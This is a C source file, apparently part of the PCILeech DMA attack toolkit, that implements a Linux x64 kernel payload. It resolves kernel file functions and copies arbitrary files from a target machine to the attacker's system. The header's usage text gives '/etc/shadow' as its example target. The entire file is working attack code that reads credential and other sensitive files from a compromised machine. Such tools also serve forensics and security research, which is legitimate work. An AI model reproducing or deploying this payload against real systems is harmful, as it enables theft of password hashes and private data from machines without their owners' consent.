// lx64_filepull.c : kernel code to pull files from target system.
// Compatible with Linux x64.
//
// (c) Ulf Frisk, 2016-2021
// Author: Ulf Frisk, pcileech@frizk.net
//
// compile with:
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel lx64_common.c
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel lx64_filepull.c
// ml64 lx64_common_a.asm /Felx64_filepull.exe /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main lx64_filepull.obj lx64_common.obj
// shellcode64.exe -o lx64_filepull.exe "PULL FILES FROM TARGET SYSTEM                                  \nLINUX X64 EDITION                                              \n===============================================================\nPull a file from the target system to the local system.        \nREQUIRED OPTIONS:                                              \n  -out : file on local system to write result to.              \n         filename is given in normal format.                   \n         Example: '-out c:\temp\shadow'                        \n  -s : file on target system.                                  \n         Example: '-s /etc/shadow'                             \n===== PULL ATTEMPT DETAILED RESULT INFORMATION ================\nFILE NAME     : %s\nRESULT CODE   : 0x%08X\n===============================================================\n"
// 

#include "lx64_common.h"

#define O_RDONLY        00000000
#define O_LARGEFILE     00100000

typedef struct tdFN2 {
	QWORD filp_close;
	QWORD filp_open;
	QWORD vfs_read;
	QWORD kernel_read;
	QWORD memcpy;
} FN2, *PFN2;

BOOL LookupFunctions2(PKMDDATA pk, PFN2 pfn2) {
	QWORD NAMES[5];
	CHAR str_filp_close[] = {'f', 'i', 'l', 'p', '_', 'c', 'l', 'o', 's', 'e', 0};
	CHAR str_filp_open[] = { 'f', 'i', 'l', 'p', '_', 'o', 'p', 'e', 'n', 0 };
	CHAR str_vfs_read[] = { 'v', 'f', 's', '_', 'r', 'e', 'a', 'd', 0 };
	CHAR str_kernel_read[] = { 'k', 'e', 'r', 'n', 'e', 'l', '_', 'r', 'e', 'a', 'd', 0 };
	CHAR str_memcpy[] = { 'm', 'e', 'm', 'c', 'p', 'y', 0 };
	NAMES[0] = (QWORD)str_filp_close;
	NAMES[1] = (QWORD)str_filp_open;
	NAMES[2] = (QWORD)str_vfs_read;
	NAMES[3] = (QWORD)str_kernel_read;
	NAMES[4] = (QWORD)str_memcpy;
	return LookupFunctions(pk->AddrKallsymsLookupName, (QWORD)NAMES, (QWORD)pfn2, 5);
}

VOID c_EntryPoint(PKMDDATA pk)
{
	FN2 fn2;
	QWORD hFile, qwOffset = 0;
	BOOL isModeLargeTransfer = FALSE;
	if(!LookupFunctions2(pk, &fn2)) {
		pk->dataOut[0] = STATUS_FAIL_FUNCTION_LOOKUP;
		return;
	}
	SysVCall(fn2.memcpy, pk->dataOutStr, pk->dataInStr, MAX_PATH);
	hFile = SysVCall(fn2.filp_open, pk->dataInStr, O_RDONLY | O_LARGEFILE, pk->dataIn[0]);
	if(hFile > 0xffffffff00000000) {
		pk->dataOut[0] = STATUS_FAIL_FILE_CANNOT_OPEN;
		return;
	}
	while(TRUE) {
		pk->dataOutExtraLength = SysVCall(
			fn2.kernel_read ? fn2.kernel_read : fn2.vfs_read,
			hFile,
			pk->DMAAddrVirtual + pk->dataOutExtraOffset,
			pk->dataOutExtraLengthMax,
			&qwOffset
		);
		if(pk->dataOutExtraLength < pk->dataOutExtraLengthMax) {
			break;
		}
		isModeLargeTransfer = TRUE;
		if(!WriteLargeOutput_WaitNext(pk)) {
			pk->dataOutExtraLength = 0;
			pk->dataOut[0] = STATUS_FAIL_PCILEECH_CORE;
			SysVCall(fn2.filp_close, hFile, NULL);
			return;
		}
	}
	if(isModeLargeTransfer) {
		WriteLargeOutput_Finish(pk);
	}
	SysVCall(fn2.filp_close, hFile, NULL);
}